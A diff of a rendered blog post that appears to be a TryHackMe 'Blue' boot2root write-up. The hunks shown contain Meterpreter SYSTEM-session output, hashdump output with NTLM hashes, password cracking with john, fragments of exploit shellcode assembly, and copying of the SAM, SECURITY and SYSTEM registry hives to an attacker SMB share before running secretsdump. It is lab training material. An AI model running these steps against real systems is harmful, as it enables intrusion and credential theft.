@@ -1,4 +1,4 @@
-<!doctype html><html lang=en-us><head><title>Blue Boot2Root Write-Up | Nate Catelli's Blog</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="A boot2root writeup of the Blue host from TryHackMe."><meta name=generator content="Hugo 0.101.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link rel=stylesheet href=/css/style.css></head><body><nav class=navigation><a href=/><span class=arrow>←</span>Home</a>
+<!doctype html><html lang=en-us><head><title>Blue Boot2Root Write-Up | Nate Catelli's Blog</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="A boot2root writeup of the Blue host from TryHackMe."><meta name=generator content="Hugo 0.110.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link rel=stylesheet href=/css/style.css></head><body><nav class=navigation><a href=/><span class=arrow>←</span>Home</a>
 <a href=/posts>Archive</a>
 <a href=/tags>Tags</a>
 <a href=/about>About</a>
@@ -195,49 +195,49 @@
 </span></span><span style=display:flex><span>meterpreter &gt; getuid 
 </span></span><span style=display:flex><span>Server username: NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM
 </span></span></code></pre></div><p>SUCCESS! And it left me with <code>NT AUTHORITY\SYSTEM</code> credentials. At this point the machine was mine, but I had to make sure that I had a stable foothold on the machine before proceeding to search for flags.</p><h3 id=foothold>Foothold <a href=#foothold class=anchor>🔗</a></h3><p>The first step was making sure my shell on the host was stable. So I checked my pid and looked to see if I could migrate it to something like the print spooler.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>meterpreter &gt; getpid 
-</span></span><span style=display:flex><span>Current pid<span style=color:#960050;background-color:#1e0010>:</span> 1304
+</span></span><span style=display:flex><span>Current pid<span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>1304</span>
 </span></span><span style=display:flex><span>meterpreter &gt; ps
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>Process</span> List
 </span></span><span style=display:flex><span>============
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span> PID   PPID  Name                  Arch  Session  User                          Path
-</span></span><span style=display:flex><span> 492   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
-</span></span><span style=display:flex><span> 560   552   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.execorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe    NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exes.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exenlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.execes.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exem.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exesvchost.exe           x64   0        NT AUTHORITY\SYSTEM           
-</span></span><span style=display:flex><span> 900   708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
-</span></span><span style=display:flex><span> 948   708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
-</span></span><span style=display:flex><span> 1016  660   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exeost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
-</span></span><span style=display:flex><span> 1172  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
-</span></span><span style=display:flex><span> 1304  708   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
-</span></span><span style=display:flex><span> 1340  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
-</span></span><span style=display:flex><span> 1408  708   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
-</span></span><span style=display:flex><span> 1480  708   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
-</span></span><span style=display:flex><span> 1616  708   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
-</span></span><span style=display:flex><span> 1956  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
-</span></span><span style=display:flex><span> 2060  708   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           
-</span></span><span style=display:flex><span> 2072  832   WmiPrvSE.exe                                                       
-</span></span><span style=display:flex><span> 2184  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
-</span></span><span style=display:flex><span> 2220  708   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
-</span></span><span style=display:flex><span> 2496  708   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           
-</span></span><span style=display:flex><span> 2548  708   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  
-</span></span><span style=display:flex><span> 2956  708   vds.exe               x64   0        NT AUTHORITY\SYSTEM           
-</span></span><span style=display:flex><span> 2996  708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>492</span>   <span style=color:#ae81ff>708</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>560</span>   <span style=color:#ae81ff>552</span>   csrss.exe             x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.execorsvw.exe          x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.<span style=color:#ae81ff>30319</span>\mscorsvw.exe    NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exes.exe             x64   <span style=color:#ae81ff>1</span>        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exenlogon.exe          x64   <span style=color:#ae81ff>1</span>        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.execes.exe          x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe.exe             x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exem.exe               x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exesvchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>900</span>   <span style=color:#ae81ff>708</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\NETWORK SERVICE  
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>948</span>   <span style=color:#ae81ff>708</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\LOCAL SERVICE    
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>1016</span>  <span style=color:#ae81ff>660</span>   LogonUI.exe           x64   <span style=color:#ae81ff>1</span>        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exeost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\LOCAL SERVICE    
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>1172</span>  <span style=color:#ae81ff>708</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\NETWORK SERVICE  
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>1304</span>  <span style=color:#ae81ff>708</span>   spoolsv.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>1340</span>  <span style=color:#ae81ff>708</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\LOCAL SERVICE    
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>1408</span>  <span style=color:#ae81ff>708</span>   amazon-ssm-agent.exe  x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>1480</span>  <span style=color:#ae81ff>708</span>   LiteAgent.exe         x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>1616</span>  <span style=color:#ae81ff>708</span>   Ec2Config.exe         x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>1956</span>  <span style=color:#ae81ff>708</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\NETWORK SERVICE  
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>2060</span>  <span style=color:#ae81ff>708</span>   SearchIndexer.exe     x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>2072</span>  <span style=color:#ae81ff>832</span>   WmiPrvSE.exe                                                       
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>2184</span>  <span style=color:#ae81ff>708</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\LOCAL SERVICE    
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>2220</span>  <span style=color:#ae81ff>708</span>   mscorsvw.exe          x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.<span style=color:#ae81ff>30319</span>\mscorsvw.exe
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>2496</span>  <span style=color:#ae81ff>708</span>   TrustedInstaller.exe  x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>2548</span>  <span style=color:#ae81ff>708</span>   sppsvc.exe            x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\NETWORK SERVICE  
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>2956</span>  <span style=color:#ae81ff>708</span>   vds.exe               x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>2996</span>  <span style=color:#ae81ff>708</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM
 </span></span></code></pre></div><p>Luckily for me it already looked like it was in the injected in the spool service so there was no need to proceed with a migration.</p><p>Even though I already knew where this host was running from deploying it, the ps output also established that this host was an EC2 instance via the <code>ssm-agent</code>, <code>LiteAgent</code> and <code>Ec2Config</code> processes. This could have also been observed in the nmap scans via the reverse dns lookup, but I thought it was worth calling out.</p><p>Confirmed again with a quick run of the <code>post/windows/gather/checkvm</code> module.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; run post/windows/gather/checkvm 
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Checking <span style=color:#66d9ef>if</span> JON-PC is a Virtual Machine ...
 </span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> This is a Xen Virtual Machine
 </span></span></code></pre></div><p>Finally I grabbed a sysinfo output to confirm a bunch of information that I had already assumed or known.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>meterpreter &gt; sysinfo 
 </span></span><span style=display:flex><span>Computer        <span style=color:#960050;background-color:#1e0010>:</span> JON-PC
-</span></span><span style=display:flex><span>OS              <span style=color:#960050;background-color:#1e0010>:</span> Windows 7 (6.1 Build 7601, Service Pack 1).
+</span></span><span style=display:flex><span>OS              <span style=color:#960050;background-color:#1e0010>:</span> Windows <span style=color:#ae81ff>7</span> (<span style=color:#ae81ff>6.1</span> Build <span style=color:#ae81ff>7601</span>, Service Pack <span style=color:#ae81ff>1</span>).
 </span></span><span style=display:flex><span>Architecture    <span style=color:#960050;background-color:#1e0010>:</span> x64
 </span></span><span style=display:flex><span>System Language <span style=color:#960050;background-color:#1e0010>:</span> en_US
 </span></span><span style=display:flex><span>Domain          <span style=color:#960050;background-color:#1e0010>:</span> WORKGROUP
-</span></span><span style=display:flex><span>Logged On Users <span style=color:#960050;background-color:#1e0010>:</span> 0
+</span></span><span style=display:flex><span>Logged On Users <span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>0</span>
 </span></span><span style=display:flex><span>Meterpreter     <span style=color:#960050;background-color:#1e0010>:</span> x64/windows
 </span></span></code></pre></div><p>With all this information, I attempted to grab a hashdump to pivot from this shell to a longer-lived user.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>meterpreter &gt; hashdump 
-</span></span><span style=display:flex><span>Administrator<span style=color:#960050;background-color:#1e0010>:</span>500<span style=color:#960050;background-color:#1e0010>:</span>aad3b435b51404eeaad3b435b51404ee<span style=color:#960050;background-color:#1e0010>:</span>31d6cfe0d16ae931b73c59d7e0c089c0::<span style=color:#960050;background-color:#1e0010>:</span>
-</span></span><span style=display:flex><span>Guest<span style=color:#960050;background-color:#1e0010>:</span>501<span style=color:#960050;background-color:#1e0010>:</span>aad3b435b51404eeaad3b435b51404ee<span style=color:#960050;background-color:#1e0010>:</span>31d6cfe0d16ae931b73c59d7e0c089c0::<span style=color:#960050;background-color:#1e0010>:</span>
-</span></span><span style=display:flex><span>Jon<span style=color:#960050;background-color:#1e0010>:</span>1000<span style=color:#960050;background-color:#1e0010>:</span>aad3b435b51404eeaad3b435b51404ee<span style=color:#960050;background-color:#1e0010>:</span>ffb43f0de35be4d9917ac0cc8ad57f8d::<span style=color:#960050;background-color:#1e0010>:</span>
+</span></span><span style=display:flex><span>Administrator<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>500</span><span style=color:#960050;background-color:#1e0010>:</span>aad3b435b51404eeaad3b435b51404ee<span style=color:#960050;background-color:#1e0010>:</span>31d6cfe0d16ae931b73c59d7e0c089c0::<span style=color:#960050;background-color:#1e0010>:</span>
+</span></span><span style=display:flex><span>Guest<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>501</span><span style=color:#960050;background-color:#1e0010>:</span>aad3b435b51404eeaad3b435b51404ee<span style=color:#960050;background-color:#1e0010>:</span>31d6cfe0d16ae931b73c59d7e0c089c0::<span style=color:#960050;background-color:#1e0010>:</span>
+</span></span><span style=display:flex><span>Jon<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>1000</span><span style=color:#960050;background-color:#1e0010>:</span>aad3b435b51404eeaad3b435b51404ee<span style=color:#960050;background-color:#1e0010>:</span>ffb43f0de35be4d9917ac0cc8ad57f8d::<span style=color:#960050;background-color:#1e0010>:</span>
 </span></span></code></pre></div><p>And of course, there is Jon. With our hashes and users, I dumped these credentials into a file and ran <code>john</code> against it with Kali&rsquo;s copy of the <code>rockyou.txt</code> password list.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf/blue# john --format<span style=color:#f92672>=</span>NT --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt hash.txt 
 </span></span><span style=display:flex><span>Created directory: /root/.john
 </span></span><span style=display:flex><span>Using default input encoding: UTF-8
@@ -360,13 +360,13 @@
 </span></span><span style=display:flex><span>userland_start_thread:
 </span></span><span style=display:flex><span>    <span style=color:#75715e>; CreateThread(NULL, 0, &amp;threadstart, NULL, 0, NULL)
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>xchg</span> <span style=color:#66d9ef>rdx</span>, <span style=color:#66d9ef>rax</span>   <span style=color:#75715e>; rdx is CreateThread address passed from kernel
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>xor</span> <span style=color:#66d9ef>ecx</span>, <span style=color:#66d9ef>ecx</span>    <span style=color:#75715e>; lpThreadAttributes = NULL
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>rcx</span>        <span style=color:#75715e>; lpThreadId = NULL
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>rcx</span>        <span style=color:#75715e>; dwCreationFlags = 0
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>mov</span> <span style=color:#66d9ef>r9</span>, <span style=color:#66d9ef>rcx</span>     <span style=color:#75715e>; lpParameter = NULL
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>lea</span> <span style=color:#66d9ef>r8</span>, [<span style=color:#66d9ef>rel</span> <span style=color:#66d9ef>userland_payload</span>]  <span style=color:#75715e>; lpStartAddr
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>mov</span> <span style=color:#66d9ef>edx</span>, <span style=color:#66d9ef>ecx</span>    <span style=color:#75715e>; dwStackSize = 0
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>sub</span> <span style=color:#66d9ef>rsp</span>, <span style=color:#ae81ff>0x20</span>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>xor</span> <span style=color:#66d9ef>ecx</span>, <span style=color:#66d9ef>ecx</span>    <span style=color:#75715e>; lpThreadAttributes = NULL
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>push</span> <span style=color:#66d9ef>rcx</span>        <span style=color:#75715e>; lpThreadId = NULL
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>push</span> <span style=color:#66d9ef>rcx</span>        <span style=color:#75715e>; dwCreationFlags = 0
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>mov</span> <span style=color:#66d9ef>r9</span>, <span style=color:#66d9ef>rcx</span>     <span style=color:#75715e>; lpParameter = NULL
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>lea</span> <span style=color:#66d9ef>r8</span>, [<span style=color:#66d9ef>rel</span> <span style=color:#66d9ef>userland_payload</span>]  <span style=color:#75715e>; lpStartAddr
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>mov</span> <span style=color:#66d9ef>edx</span>, <span style=color:#66d9ef>ecx</span>    <span style=color:#75715e>; dwStackSize = 0
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>sub</span> <span style=color:#66d9ef>rsp</span>, <span style=color:#ae81ff>0x20</span>
 </span></span><span style=display:flex><span>    <span style=color:#a6e22e>call</span> <span style=color:#66d9ef>rax</span>
 </span></span><span style=display:flex><span>    <span style=color:#a6e22e>add</span> <span style=color:#66d9ef>rsp</span>, <span style=color:#ae81ff>0x30</span>
 </span></span><span style=display:flex><span>    <span style=color:#a6e22e>ret</span>
@@ -435,17 +435,17 @@
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span> Directory of C:\
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>03/17/2019  01<span style=color:#960050;background-color:#1e0010>:</span>27 PM                24 flag1.txt
-</span></span><span style=display:flex><span>07/13/2009  09<span style=color:#960050;background-color:#1e0010>:</span>20 PM    &lt;DIR&gt;          PerfLogs
-</span></span><span style=display:flex><span>04/12/2011  02<span style=color:#960050;background-color:#1e0010>:</span>28 AM    &lt;DIR&gt;          Program Files
-</span></span><span style=display:flex><span>03/17/2019  04<span style=color:#960050;background-color:#1e0010>:</span>28 PM    &lt;DIR&gt;          Program Files (x86)
-</span></span><span style=display:flex><span>11/10/2020  10<span style=color:#960050;background-color:#1e0010>:</span>18 PM            24,576 sam.save
-</span></span><span style=display:flex><span>11/10/2020  10<span style=color:#960050;background-color:#1e0010>:</span>18 PM            24,576 security.save
-</span></span><span style=display:flex><span>11/10/2020  10<span style=color:#960050;background-color:#1e0010>:</span>19 PM        12,353,536 system.save
-</span></span><span style=display:flex><span>12/12/2018  09<span style=color:#960050;background-color:#1e0010>:</span>13 PM    &lt;DIR&gt;          Users
-</span></span><span style=display:flex><span>03/17/2019  04<span style=color:#960050;background-color:#1e0010>:</span>36 PM    &lt;DIR&gt;          Windows
-</span></span><span style=display:flex><span>               4 File(s)     12,402,712 bytes
-</span></span><span style=display:flex><span>               5 Dir(s)  20,753,133,568 bytes free
+</span></span><span style=display:flex><span><span style=color:#ae81ff>03</span>/<span style=color:#ae81ff>17</span>/<span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>01</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>27</span> PM                <span style=color:#ae81ff>24</span> flag1.txt
+</span></span><span style=display:flex><span><span style=color:#ae81ff>07</span>/<span style=color:#ae81ff>13</span>/<span style=color:#ae81ff>2009</span>  <span style=color:#ae81ff>09</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>20</span> PM    &lt;DIR&gt;          PerfLogs
+</span></span><span style=display:flex><span><span style=color:#ae81ff>04</span>/<span style=color:#ae81ff>12</span>/<span style=color:#ae81ff>2011</span>  <span style=color:#ae81ff>02</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>28</span> AM    &lt;DIR&gt;          Program Files
+</span></span><span style=display:flex><span><span style=color:#ae81ff>03</span>/<span style=color:#ae81ff>17</span>/<span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>04</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>28</span> PM    &lt;DIR&gt;          Program Files (x86)
+</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>10</span>/<span style=color:#ae81ff>2020</span>  <span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>18</span> PM            <span style=color:#ae81ff>24</span>,<span style=color:#ae81ff>576</span> sam.save
+</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>10</span>/<span style=color:#ae81ff>2020</span>  <span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>18</span> PM            <span style=color:#ae81ff>24</span>,<span style=color:#ae81ff>576</span> security.save
+</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>10</span>/<span style=color:#ae81ff>2020</span>  <span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>19</span> PM        <span style=color:#ae81ff>12</span>,<span style=color:#ae81ff>353</span>,<span style=color:#ae81ff>536</span> system.save
+</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span>/<span style=color:#ae81ff>12</span>/<span style=color:#ae81ff>2018</span>  <span style=color:#ae81ff>09</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>13</span> PM    &lt;DIR&gt;          Users
+</span></span><span style=display:flex><span><span style=color:#ae81ff>03</span>/<span style=color:#ae81ff>17</span>/<span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>04</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>36</span> PM    &lt;DIR&gt;          Windows
+</span></span><span style=display:flex><span>               <span style=color:#ae81ff>4</span> File(s)     <span style=color:#ae81ff>12</span>,<span style=color:#ae81ff>402</span>,<span style=color:#ae81ff>712</span> bytes
+</span></span><span style=display:flex><span>               <span style=color:#ae81ff>5</span> Dir(s)  <span style=color:#ae81ff>20</span>,<span style=color:#ae81ff>753</span>,<span style=color:#ae81ff>133</span>,<span style=color:#ae81ff>568</span> bytes free
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>C:\&gt;type flag1.txt
 </span></span><span style=display:flex><span>type flag1.txt
@@ -465,9 +465,9 @@
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>root@kali:~# netstat -plunt | grep <span style=color:#ae81ff>445</span>
 </span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:445             0.0.0.0:*               LISTEN      1428/python3
-</span></span></code></pre></div><p>From the target host I was now able to validate that I could see and connect to the newly started share and promptly copied the hives back to my attack machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\&gt;net view \\10.10.47.175
-</span></span><span style=display:flex><span>net view \\10.10.47.175
-</span></span><span style=display:flex><span>Shared resources at \\10.10.47.175
+</span></span></code></pre></div><p>From the target host I was now able to validate that I could see and connect to the newly started share and promptly copied the hives back to my attack machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\&gt;net view \\<span style=color:#ae81ff>10.10</span>.47.175
+</span></span><span style=display:flex><span>net view \\<span style=color:#ae81ff>10.10</span>.47.175
+</span></span><span style=display:flex><span>Shared resources at \\<span style=color:#ae81ff>10.10</span>.47.175
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>(null)
 </span></span><span style=display:flex><span>
@@ -478,17 +478,17 @@
 </span></span><span style=display:flex><span>The command completed successfully.
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>C:\&gt;copy C:\sam.save \\10.10.47.175\BLUE\sam.save
-</span></span><span style=display:flex><span>copy C:\sam.save \\10.10.47.175\BLUE\sam.save
-</span></span><span style=display:flex><span>        1 file(s) copied.
+</span></span><span style=display:flex><span>C:\&gt;copy C:\sam.save \\<span style=color:#ae81ff>10.10</span>.47.<span style=color:#ae81ff>175</span>\BLUE\sam.save
+</span></span><span style=display:flex><span>copy C:\sam.save \\<span style=color:#ae81ff>10.10</span>.47.<span style=color:#ae81ff>175</span>\BLUE\sam.save
+</span></span><span style=display:flex><span>        <span style=color:#ae81ff>1</span> file(s) copied.
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>C:\&gt;copy C:\security.save \\10.10.47.175\BLUE\security.save
-</span></span><span style=display:flex><span>copy C:\security.save \\10.10.47.175\BLUE\security.save
-</span></span><span style=display:flex><span>        1 file(s) copied.
+</span></span><span style=display:flex><span>C:\&gt;copy C:\security.save \\<span style=color:#ae81ff>10.10</span>.47.<span style=color:#ae81ff>175</span>\BLUE\security.save
+</span></span><span style=display:flex><span>copy C:\security.save \\<span style=color:#ae81ff>10.10</span>.47.<span style=color:#ae81ff>175</span>\BLUE\security.save
+</span></span><span style=display:flex><span>        <span style=color:#ae81ff>1</span> file(s) copied.
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>C:\&gt;copy C:\system.save \\10.10.47.175\BLUE\system.save
-</span></span><span style=display:flex><span>copy C:\system.save \\10.10.47.175\BLUE\system.save
-</span></span><span style=display:flex><span>        1 file(s) copied.
+</span></span><span style=display:flex><span>C:\&gt;copy C:\system.save \\<span style=color:#ae81ff>10.10</span>.47.<span style=color:#ae81ff>175</span>\BLUE\system.save
+</span></span><span style=display:flex><span>copy C:\system.save \\<span style=color:#ae81ff>10.10</span>.47.<span style=color:#ae81ff>175</span>\BLUE\system.save
+</span></span><span style=display:flex><span>        <span style=color:#ae81ff>1</span> file(s) copied.
 </span></span></code></pre></div><p>With these credentials now available locally, I could extract the user hashes using <code>secretsdump</code> from impacket and perform the same attack with <code>john</code> that I had performed before.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf/extractor# impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
 </span></span><span style=display:flex><span>Impacket v0.9.21 - Copyright <span style=color:#ae81ff>2020</span> SecureAuth Corporation
 </span></span><span style=display:flex><span>
